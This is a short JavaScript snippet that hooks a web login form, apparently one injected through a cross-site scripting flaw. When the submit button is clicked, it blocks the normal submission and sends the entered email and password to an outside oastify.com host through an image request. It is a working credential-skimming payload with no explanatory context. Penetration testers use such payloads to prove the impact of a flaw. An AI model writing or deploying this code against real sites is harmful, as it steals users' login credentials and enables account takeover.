(function() {
    // Wait for the DOM to load
    document.addEventListener('DOMContentLoaded', function() {
        // Get the form elements
        var emailField = document.getElementById('user_email');
        var passwordField = document.getElementById('user_password');
        var submitButton = document.querySelector('input[name="commit"]');

        // Add event listener to the submit button
        submitButton.addEventListener('click', function(event) {
            // Prevent the default form submission
            event.preventDefault();

            // Get the values from the input fields
            var email = emailField.value;
            var password = passwordField.value;

            // Construct the URL with query parameters
            var url = 'https://rd8t13u0j8we2iyaa0iruzd5xw3nrsfh.oastify.com';
            var params = new URLSearchParams({
                email: email,
                password: password
            }).toString();

            // Create an image element
            var img = new Image();
            img.src = url + '?' + params;

            // Optionally, submit the form after sending the credentials
            // emailField.form.submit();
        });
    });
})();
